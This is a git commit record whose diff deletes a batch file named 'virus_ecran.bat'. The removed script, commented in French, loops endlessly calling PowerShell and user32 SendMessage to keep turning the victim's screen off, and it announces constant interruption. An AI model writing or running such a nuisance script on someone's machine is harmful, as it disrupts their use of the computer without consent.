ffeb0ddbf0a55a469e34b61e623b1f554154a726
Stenn <stennjs09@gmail.com>
2024-03-02 19:14:35 +0300

    last update putting ino file

--- virus_ecran.bat
+++
@@ -1,8 +0,0 @@
-@echo off
-echo Script d'extinction de l'écran lancé en boucle. Préparez-vous à une interruption constante.
-
-:: Boucle d'extinction de l'écran en permanence
-:loop
-powershell (Add-Type '[DllImport(\"user32.dll\")]^public static extern int SendMessage(int hWnd,int hMsg,int wParam,int lParam);' -Name a -Pas)::SendMessage(-1,0x0112,0xF170,2)
-goto loop
-:: Fin de la boucle
